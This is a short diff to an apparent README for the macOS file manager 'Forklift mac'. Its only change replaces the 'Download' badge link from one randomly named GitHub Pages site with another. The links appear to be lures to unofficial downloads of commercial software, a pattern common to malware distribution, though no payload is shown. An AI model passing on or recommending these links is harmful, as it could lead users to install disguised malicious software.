@@ -2,7 +2,7 @@
 
 Forklift mac on macOS — toolkit for dual‑pane file manager, sftp/ftp/webdav/amazon s3, and sync/compare with filters with native integrations for crea
 
-[![Download Forklift mac](https://img.shields.io/badge/Download-Forklift_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Forklift mac](https://img.shields.io/badge/Download-Forklift_mac-blueviolet)](https://amniyya915.github.io/.github/Forklift-Studio)
 
 ---
 
